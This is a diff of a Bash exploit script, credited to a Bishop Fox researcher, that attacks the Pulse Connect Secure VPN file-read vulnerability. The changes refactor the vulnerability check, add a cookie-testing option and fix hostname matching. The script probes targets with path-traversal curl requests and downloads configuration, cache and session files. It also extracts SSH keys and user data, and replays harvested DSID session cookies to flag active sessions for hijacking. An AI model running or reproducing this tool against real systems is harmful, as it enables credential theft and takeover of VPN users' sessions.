@@ -2,8 +2,9 @@
 #
 # Script authored by braindead @BishopFox
 # Based on research by Orange Tsai and Meh Chang:
-# https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html
-# Thanks also to Alyssa Herrera and 0xDezzy for additional insights
+# https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html.
+# Thanks also to Alyssa Herrera and 0xDezzy for additional insights.
+# Huge thanks to @bl4ckh0l3z for fixes, cleaning and refactoring the code significantly!
 #
 
 PROGNAME=${0##*/}
@@ -38,6 +39,7 @@ EO
         -t & set the target (IPs - single entry by stdin, in csv format, single column in a file)
         -d & download config, cache and sessions files
         -c & test cookies in order to identify active sessions
+        -k & test cookies without downloading files (already downloaded and extracted)
         -s & extract ssh keys
         -a & all tests
 EO
@@ -49,7 +51,7 @@ function get_opts {
   if [[ "$@" == "" ]];then
     print_usage
   else
-    while getopts ":ht:dcsa" opt;do
+    while getopts ":ht:dcksa" opt;do
       case ${opt} in
         t ) target_list=$OPTARG
             ;;
@@ -57,6 +59,8 @@ function get_opts {
             ;;
         c ) is_test_cookies=true
             is_download=true
+            ;;
+        k ) is_test_cookies=true            
             ;;
         s ) is_ssh_keys=true
             is_download=true
@@ -82,21 +86,21 @@ function check_target {
     target_file=${target_list}
     target_list=''
     while read -r line;do
-      target_list+="$(echo ${line} | egrep -o "(^([0-9]{1,3}\.){3}[0-9]{1,3}$)|(^[-\.a-zA-Z]+$)") "
+      target_list+="$(echo ${line} | egrep -o "(^([0-9]{1,3}\.){3}[0-9]{1,3}$)|(^[-\.a-zA-Z]+[0-9]*[-\.a-zA-Z]*$)") "
     done < "${target_file}"
   else
-    target_list=$(echo ${target_list} | egrep -o "(([0-9]{1,3}\.){3}[0-9]{1,3})|([-\.a-zA-Z]+)")
+    target_list=$(echo ${target_list} | egrep -o "(([0-9]{1,3}\.){3}[0-9]{1,3})|(^[-\.a-zA-Z]+[0-9]*[-\.a-zA-Z]*$)")
   fi
   target_list=$(echo ${target_list} | sed -E 's/\s/\n/g' | sort -u)
   if [ "${target_list}" == "" ];then
     echo "  [!] Target empty or unrecognized!"
     exit 1
   else
-    target_list_domains=$(echo "${target_list}" | egrep "^[-\.a-zA-Z]+$")
+    target_list_domains=$(echo "${target_list}" | egrep "^[-\.a-zA-Z]+[0-9]*[-\.a-zA-Z]*$")
     for d in $target_list_domains;do
       ip=$(dig +short ${d})
       if [ $(echo "${target_list}" | grep -c "^${ip}$") -ne 0 ];then
-        echo "  [!] Discarding '${ip}' because it is alreay in queue as '${d}'"
+        echo "  [!] Discarding '${ip}' because it is already in queue as '${d}'"
         target_list=$(echo "${target_list}" | grep -v "^${ip}$")
       fi
     done
@@ -129,7 +133,20 @@ function extract_product_version {
     write_report $target "Pulse Connect Secure version" "${version}" "true"
   else
     echo "    [-] Pulse Connect Secure version is not recognized!"
-    rm -rf $DATA_DIR/$target
+  fi
+}
+
+function check_vulnerable {
+  target=$1
+  echo "  [#] Check if vulnerable..."
+  status=$(curl -skIo /dev/null -w "%{http_code}" --path-as-is https://${target}/${URL_VULN_CHECK})
+  if [ "$status" == "200" ];then
+    echo "    [+] Vulnerable!"
+    download_files $target
+  else
+    echo "    [-] Not vulnerable"
+    rm -rf $DATA_DIR/$target/${target}_*
+    write_report $target "'$target' exploitation attempt" "'$target' is not vulnerable!" "true"
     return 1
   fi
 }
@@ -137,27 +154,18 @@ function extract_product_version {
 function download_files {
   target=$1
   if [ $is_download == true ];then
-    echo "  [#] Download is enabled"    
-    echo "    [#] Check if vulnerable..."
-    status=$(curl -skIo /dev/null -w "%{http_code}" --path-as-is https://${target}/${URL_VULN_CHECK})
-    if [ "$status" == "200" ];then
-      echo "      [+] Vulnerable!"
-      echo "    [#] Downloading config (1/3)..."
-      curl -sk --path-as-is https://${target}/${URL_DOWN_CONFIG} --output $DATA_DIR/$target/${target}_config
-      echo "    [#] Downloading cache (2/3)..."
-      curl -sk --path-as-is https://${target}/${URL_DOWN_CACHE} --output $DATA_DIR/$target/${target}_cache
-      echo "    [#] Downloading sessions data (3/3)..."
-      curl -sk --path-as-is https://${target}/${URL_DOWN_SESSIONS} --output $DATA_DIR/$target/${target}_sessions
-      if [[ ! -f $DATA_DIR/$target/${target}_config || ! -f $DATA_DIR/$target/${target}_cache || ! -f $DATA_DIR/$target/${target}_sessions ]];then
-        echo "      [-] Fail"
-        return 1
-      fi
-      echo "      [+] Done"
-    else
-      echo "      [-] Not vulnerable"
-      rm -rf $DATA_DIR/$target/${target}_*
+    echo "  [#] Download is enabled"
+    echo "    [#] Downloading config (1/3)..."
+    curl -sk --path-as-is https://${target}/${URL_DOWN_CONFIG} --output $DATA_DIR/$target/${target}_config
+    echo "    [#] Downloading cache (2/3)..."
+    curl -sk --path-as-is https://${target}/${URL_DOWN_CACHE} --output $DATA_DIR/$target/${target}_cache
+    echo "    [#] Downloading sessions data (3/3)..."
+    curl -sk --path-as-is https://${target}/${URL_DOWN_SESSIONS} --output $DATA_DIR/$target/${target}_sessions
+    if [[ ! -f $DATA_DIR/$target/${target}_config || ! -f $DATA_DIR/$target/${target}_cache || ! -f $DATA_DIR/$target/${target}_sessions ]];then
+      echo "      [-] Fail"
       return 1
     fi
+    echo "      [+] Done"
   else
     echo "  [!] Download is disabled"
   fi
@@ -507,40 +515,45 @@ function extract_vpn_logins {
 
 function extract_vpn_session_cookies {
   target=$1
-  if [ $is_download == true ];then
+  if [[ $is_download == true || $is_test_cookies == true ]];then
     echo "  [#] Extracting VPN session cookies (DSIDs)..."
     # These cookies are vulnerable to hijacking when used before they expire or
     # the user logs out. Once connected to the VPN, other exploits can be used.
-    adminuids=( $(while IFS= read -r line;do echo "$line" | cut -d: -f3; done < $DATA_DIR/$target/${target}_admins) )
-    data="Value & User\n" 
-    if [ $is_test_cookies == true ];then
-      # Test for active sessions (unless disabled)
-      echo "    [#] Testing client session cookies..."
-      while IFS= read -r line;do
-        uid=$(echo "$line" | cut -d: -f2)
-        # Skip admins
-        skip=false
-        for adminuid in "${adminuids[@]}";do
-          if [ "$uid" == "$adminuid" ];then
-            skip=true
+    if [[ -f $DATA_DIR/$target/${target}_admins && -f $DATA_DIR/$target/${target}_dsids ]];then
+      adminuids=( $(while IFS= read -r line;do echo "$line" | cut -d: -f3; done < $DATA_DIR/$target/${target}_admins) )
+      data="Value & User\n" 
+      if [ $is_test_cookies == true ];then
+        # Test for active sessions (unless disabled)
+        echo "    [#] Testing client session cookies..."
+        while IFS= read -r line;do
+          uid=$(echo "$line" | cut -d: -f2)
+          # Skip admins
+          skip=false
+          for adminuid in "${adminuids[@]}";do
+            if [ "$uid" == "$adminuid" ];then
+              skip=true
+            fi
+          done
+          if [ "$skip" == false ];then
+            user=$(echo "$line" | cut -d: -f1)
+            cookie=$(echo "$line" | cut -d: -f3)
+            output="$cookie & $user"
+            status=$(curl -Iks -b "DSID=$cookie" "https://${target}/${URL_HOME}" | head -1 | cut -d ' ' -f 2)
+            if [ "$status" == "200" ];then
+              output="$output  **ACTIVE**"
+            fi
+            data+="$output\n"
           fi
-        done
-        if [ "$skip" = false ];then
-          user=$(echo "$line" | cut -d: -f1)
-          cookie=$(echo "$line" | cut -d: -f3)
-          output="$cookie & $user"
-          status=$(curl -Iks -b "DSID=$cookie" "https://${target}/${URL_HOME}" | head -1 | cut -d ' ' -f 2)
-          if [ "$status" == "200" ];then
-            output="$output  **ACTIVE**"
-          fi
-          data+="$output\n"
-        fi
-      done < $DATA_DIR/$target/${target}_dsids
+        done < $DATA_DIR/$target/${target}_dsids
+      else
+        guids=$( IFS='|'; echo "${adminuids[*]}" )
+        data+="$(grep -Ev "$guids" $DATA_DIR/$target/${target}_dsids | awk '{ split($0,a,":"); print a[3], a[1] }')\n"
+      fi
+      write_report $target "VPN Session Cookies" "${data}" "true"
     else
-      guids=$( IFS='|'; echo "${adminuids[*]}" )
-      data+="$(grep -Ev "$guids" $DATA_DIR/$target/${target}_dsids | awk '{ split($0,a,":"); print a[3], a[1] }')\n"
+      echo "    [-] VPN session cookies cannot be tested! "
+      echo "        '$DATA_DIR/$target/${target}_admins' or '$DATA_DIR/$target/${target}_dsids' don't exist!"
     fi
-    write_report $target "VPN Session Cookies" "${data}" "true"
   else
     echo "  [!] VPN session cookies extraction is disabled"
   fi    
@@ -566,10 +579,18 @@ function init_data_dir {
 
 function init_data_target_dir {
   target=$1
-  if [ -d "$DATA_DIR/$target" ];then
-    rm -Rf $DATA_DIR/$target
+  if [ ! -d "$DATA_DIR/$target" ];then
+    mkdir $DATA_DIR/$target
+  else
+    rm -f $DATA_DIR/$target/*_version $DATA_DIR/$target/*_report.txt
+    if [ $is_download == true ];then
+      rm -f $DATA_DIR/$target/*_hashes $DATA_DIR/$target/*_logins
+      rm -f $DATA_DIR/$target/*_ssh_keys $DATA_DIR/$target/*_uids $DATA_DIR/$target/*_users
+      if [ $is_test_cookies == false ];then
+        rm -f $DATA_DIR/$target/*_admins $DATA_DIR/$target/*_dsids
+      fi      
+    fi
   fi
-  mkdir $DATA_DIR/$target
 }
 
 
@@ -580,8 +601,8 @@ function main {
   for target in ${target_list};do
     init_data_target_dir ${target}
     echo -e "\n[#] Exploiting '${target}'..."
-    extract_product_version ${target} || continue
-    download_files ${target} || continue
+    extract_product_version ${target}
+    check_vulnerable ${target} || continue
     extract_ssh_keys ${target}
     extract_local_users ${target}
     extract_session_cookies ${target}
